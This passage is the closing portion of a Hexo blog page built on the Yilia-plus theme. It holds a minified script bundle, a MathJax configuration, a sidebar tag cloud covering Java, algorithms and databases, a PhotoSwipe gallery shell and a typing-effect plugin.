t?t:Function(t)).apply(this,e)}:t,n)}};i(i.G+i.B+i.F*c,{setTimeout:f(e.setTimeout),setInterval:f(e.setInterval)})},function(t,n,r){r(341),r(280),r(282),r(281),r(284),r(286),r(291),r(285),r(283),r(293),r(292),r(288),r(289),r(287),r(279),r(290),r(294),r(295),r(247),r(249),r(248),r(297),r(296),r(267),r(277),r(278),r(268),r(269),r(270),r(271),r(272),r(273),r(274),r(275),r(276),r(250),r(251),r(252),r(253),r(254),r(255),r(256),r(257),r(258),r(259),r(260),r(261),r(262),r(263),r(264),r(265),r(266),r(328),r(333),r(340),r(331),r(323),r(324),r(329),r(334),r(336),r(319),r(320),r(321),r(322),r(325),r(326),r(327),r(330),r(332),r(335),r(337),r(338),r(339),r(242),r(244),r(243),r(246),r(245),r(231),r(229),r(235),r(232),r(238),r(240),r(228),r(234),r(225),r(239),r(223),r(237),r(236),r(230),r(233),r(222),r(224),r(227),r(226),r(241),r(162),r(313),r(197),r(318),r(198),r(314),r(315),r(316),r(317),r(298),r(196),r(199),r(200),r(353),r(342),r(343),r(348),r(351),r(352),r(346),r(349),r(347),r(350),r(344),r(345),r(299),r(300),r(301),r(302),r(303),r(306),r(304),r(305),r(307),r(308),r(309),r(310),r(312),r(311),r(356),r(354),r(355),r(397),r(400),r(399),r(401),r(402),r(398),r(403),r(404),r(378),r(381),r(377),r(375),r(376),r(379),r(380),r(362),r(396),r(361),r(395),r(407),r(409),r(360),r(394),r(406),r(408),r(359),r(405),r(358),r(363),r(364),r(365),r(366),r(367),r(369),r(368),r(370),r(371),r(372),r(374),r(373),r(383),r(384),r(385),r(386),r(388),r(387),r(390),r(389),r(391),r(392),r(393),r(357),r(382),r(412),r(411),r(410),t.exports=r(46)},function(t,n){t.exports=function(t,n){if("string"==typeof n)return t.insertAdjacentHTML("afterend",n);var r=t.nextSibling;return r?t.parentNode.insertBefore(n,r):t.parentNode.appendChild(n)}}])</script><script src="/./main.5a5b0a.js"></script><script>!function(){var e,t;e="/slider.c27416.js",t=document.createElement("script"),document.getElementsByTagName("body")[0].appendChild(t),t.setAttribute("src",e)}()</script>


<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
      tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
  });

  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for(i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>

<script src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>



<!--  -->


    
<div class="tools-col" q-class="show:isShow,hide:isShow|isFalse" q-on="click:stop(e)">
  <div class="tools-nav header-menu">
    
    
      
      
      
    
      
      
      
    
      
    
    

    <ul style="width: 70%">
    
    
      
      <li style="width: 50%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">所有文章(tag)</a></li>
      
        
      
      <li style="width: 50%" q-on="click: openSlider(e, 'friends')"><a href="javascript:void(0)" q-class="active:friends">true</a></li>
      
        
      
        
    </ul>
  </div>
  <div class="tools-wrap">
    
    	<section class="tools-section tools-section-all" q-show="innerArchive">
        <div class="search-wrap">
          <input class="search-ipt" q-model="search" type="text" placeholder="find something…">
          <i class="icon-search icon" q-show="search|isEmptyStr"></i>
          <i class="icon-close icon" q-show="search|isNotEmptyStr" q-on="click:clearChose(e)"></i>
        </div>
        <div class="widget tagcloud search-tag">
          <p class="search-tag-wording">tag:</p>
          <label class="search-switch">
            <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
          </label>
          <ul class="article-tag-list" q-show="showTags">
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color1">collection</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">JAVA</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">框架</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">设计模式</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color1">nosql</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">杂项</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">算法</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">codeforce</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color1">leetcode周赛</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">操作系统</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color1">计算机基础</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">计算机基础-操作系统知识</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">记录</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">面试</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">项目</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color2">docker</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">git</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">idea</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">vue</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">wsdl</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">jvm</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">map</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color1">mysql</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">图论</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color1">计算机网络</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">计算机基础-计算机网络知识</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">线程</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">go</a>
              </li>
            
            <div class="clearfix"></div>
          </ul>
        </div>
        <ul class="search-ul">
          <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
            缺失模块。<br/>1、请确保node版本大于6.2<br/>2、在博客根目录（注意不是yilia-plus根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
            3、在根目录_config.yml里添加配置：
<pre style="font-size: 12px;" q-show="jsonFail">
  jsonContent:
    meta: false
    pages: false
    posts:
      title: true
      date: true
      path: true
      text: false
      raw: false
      content: false
      slug: false
      updated: false
      comments: false
      link: false
      permalink: false
      excerpt: false
      categories: false
      tags: true
</pre>
          </p>
          <li class="search-li" q-repeat="items" q-show="isShow">
            <a q-attr="href:path|urlformat" class="search-title"><i class="icon-quo-left icon"></i><span q-text="title"></span></a>
            <p class="search-time">
              <i class="icon-calendar icon"></i>
              <span q-text="date|dateformat"></span>
            </p>
            <p class="search-tag">
              <i class="icon-price-tags icon"></i>
              <span q-repeat="tags" q-on="click:choseTag(e, name)" q-text="name|tagformat"></span>
            </p>
          </li>
        </ul>
    	</section>
    

    
    	<section class="tools-section tools-section-friends" q-show="friends">
  		
        <ul class="search-ul">
          
            <li class="search-li">
              <a href="/" target="_blank" 
                class="search-title" >
                
                  <i class="icon-link icon"></i>
                
                url
              </a>
            </li>
          
        </ul>
  		
    	</section>
    

    
  </div>
  
</div>
    <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>
  </div>

  
  
<script type="text/javascript" src="/plugins/activate-power-mode/activate-power-mode.js"></script>
<script>
  POWERMODE.colorful = true; // make power mode colorful
  POWERMODE.shake = false; // turn off shake
  document.body.addEventListener('input', POWERMODE);
</script>

  
  <!-- <script async type="text/javascript" size="90" alpha="0.2" zIndex="0" src="/plugins/ribbon.js/ribbon.min.js"></script> -->
  
  
  
</body>

</html>
